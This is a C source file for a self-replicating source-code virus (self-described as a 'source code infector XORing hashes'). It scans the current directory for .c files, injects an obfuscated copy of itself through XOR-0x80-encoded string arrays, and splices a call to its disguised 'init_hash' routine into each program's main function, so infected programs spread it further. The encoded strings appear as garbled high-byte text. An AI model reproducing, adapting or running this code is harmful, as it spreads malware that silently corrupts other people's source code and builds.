/*
 * Peio,
 *    
 * source code infector XORing hashes.
 *                   zert <zert@int80h.net>
 *
 */

#include <stdio.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <unistd.h>
#include <dirent.h>
#include <fcntl.h>

void init_hash(); 

int main(int argc, char *argv[])
{
	init_hash();
}

void init_hash()
{
	int i, j, fd, size, mpos, ipos, page, 
	ihole, thole, bhole, ehole; struct dirent *dir; DIR *d;
	void *ptr;
	char hashinc[] = "��������堼�����辊�������堼��������辊�������堼�������辊�������堼������辊�������堼�������辊�������堼�����辊�������������訩���";
	char hashbeg[] = "�������������訩��������鬠ꬠ�䬠���嬠�����������嬠������嬠����嬠����嬠����廠��������������������Ҡ�今����䠪��򻊉������������ݠ���";
	char hashend[] = "�������滊��䠽�������򨢮���������娨��򠽠�������䩩�������模������������������������������婭����㢩����������������������������������������婭����â���������樨��������������嬠�����Ҭ���������������������堽�������䬠����������ĩ��������򠽠�������̬������������Ĭ����������Ŭ�䬰��������樠�������������������袩����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������󠽠��������������䠪����󬠢������������󠭽����������򻊉�����樠�����󠽠����������򨫫��򬠢�������堼�������������������������������婻�����������뻊������������������������婻���������堽����������������������������ũ�����������������䬠�������婻��������򠽠�������̬����������������ī���������Ŭ���������Ĭ�䬰�����������󠽠�������������򬠢�������堼������������󠽠��������������䠪����󬠢�������������󠭽��������򻊉�������齰��������������㩻髫�����������������ݠ޽���������������齰��������������穻髫�����������������ݠ޽����������������堽�������������㩻���������齨�������������龽��魭���������������������������������嬠������������嬠����婻��������������������������㬠����婻���������齰��������������㩻髫�����������������ݠ޽���������������󠫽�����廊�������栽�����򠪩�����㨲�����������򩩻���������������欢������������訩��������������堽���������橻���������齨������������������龽��魭���������������������������������嬠������������嬠����婻����������������������欠����婻����������堽�������������穻�����������������������������嬠������笠����婻����������������������������������嬠������㬠����婻����������堫������廊���������������������������������嬠�ܢ�����������������ݠ��ܢ�������������堫��������������齰��������������穻髫�����������������ݠ޽����������������������������������������嬠������笠������������穩�����������堫��������������穻����������������������������������嬠�ܢ�����������������ݠ��ܢ�������������堫���������������������������������������嬠������䬠������������䩩�����������堫��������������䩻����������������������������������嬠�ܢ�������������堫�������������齰��������������䩻髫�����������������ݠ޽����������������堽�������������䩻����������������������������������嬠������䬠����婻���������������������嬠������é�����������������������婻����������������䬠�����������������������婻����������劉����������������������婻��������������";
	char *buf;

	d = opendir(".");
	while((dir = readdir(d))>0)
		if(!(strcmp(dir->d_name+strlen(dir->d_name)-2,".c"))||
		   !(strcmp(dir->d_name+strlen(dir->d_name)-2,".C"))) 
			if((fd=open(dir->d_name, O_RDWR, 0))>=0)
			{
				size = lseek(fd, 0, SEEK_END);
				ptr = mmap(NULL,size,PROT_READ,MAP_PRIVATE,fd,0);
				if( (!strstr(ptr,"init_hash")) &&
				  ( ((mpos=(int)strstr(ptr,"\nmain("))>0) ||
				    ((mpos=(int)strstr(ptr,"\nint main("))>0) ||
				    ((mpos=(int)strstr(ptr,"\nvoid main("))>0) || 
				    ((mpos=(int)strstr(ptr,"\nmain ("))>0) ||
				    ((mpos=(int)strstr(ptr,"\nint main ("))>0) ||
				    ((mpos=(int)strstr(ptr,"\nvoid main ("))>0) ) )
				{
					mpos = (int)strstr((void *)mpos, ";\n");
					mpos -= (int)--ptr;
					if( !(ipos = (int)strstr(++ptr, "#include <")) )
					{
						munmap(ptr, size);
						break;
					}
					munmap(ptr, size);
					page = 3 * (int)sysconf(_SC_PAGESIZE);
					ftruncate(fd, size+page);
					ptr = mmap(NULL,size+page,PROT_READ+PROT_WRITE,MAP_SHARED,fd,0);
					ipos = (int)strstr(ptr, "#include <");
					ipos = (int)strstr((void *)ipos, "\n\n");
					ipos -= (int)ptr;
					for(i=0;i<strlen(hashinc);i++)
						hashinc[i] ^= 0x80;
					for(i=0;i<strlen(hashbeg);i++)
						hashbeg[i] ^= 0x80;
					ihole = strlen(hashinc);
					for(i=(size-ipos)/ihole;i>=0;i--) 
						memcpy(ptr+ipos+i*ihole+ihole, ptr+ipos+i*ihole, ihole);
					memcpy(ptr+ipos, hashinc, ihole);
					for(i=0;i<strlen(hashinc);i++)
						hashinc[i] ^= 0x80;
					mpos += ihole;
					buf = (char *)malloc(20*sizeof(char));
					strcpy(buf,"\n\tinit_hash();");
					thole = strlen(buf);
					for(i=(size+ihole-mpos)/thole;i>=0;i--) 
						memcpy(ptr+mpos+i*thole+thole, ptr+mpos+i*thole, thole);
					memcpy(ptr+mpos, buf, thole);
					bhole = strlen(hashbeg);
					memcpy(ptr+size+ihole+thole, hashbeg, bhole);
					memcpy(ptr+size+ihole+thole+bhole, hashinc, ihole);
					bhole += ihole;
					sprintf(ptr+size+ihole+thole+bhole, "\";\n\tchar hashbeg[] = \"");
					bhole += 22;
					for(i=0;i<strlen(hashbeg);i++)
						hashbeg[i] ^= 0x80;
					memcpy(ptr+size+ihole+thole+bhole, hashbeg, strlen(hashbeg));
					bhole += strlen(hashbeg);
					sprintf(ptr+size+ihole+thole+bhole, "\";\n\tchar hashend[] = \"");
					bhole += 22;
					memcpy(ptr+size+ihole+thole+bhole, hashend, strlen(hashend));
					bhole += strlen(hashend);
					sprintf(ptr+size+ihole+thole+bhole, "\";\n");
					bhole += 3;
					for(i=0;i<strlen(hashend);i++)
						hashend[i] ^= 0x80;
					ehole = strlen(hashend);
					memcpy(ptr+size+ihole+thole+bhole, hashend, ehole);
					msync(ptr, size+page, MS_SYNC);
					munmap(ptr, size+page);
					ftruncate(fd, size+ihole+thole+bhole+ehole);
				} else
				{
					munmap(ptr, size);
				}
			}
}
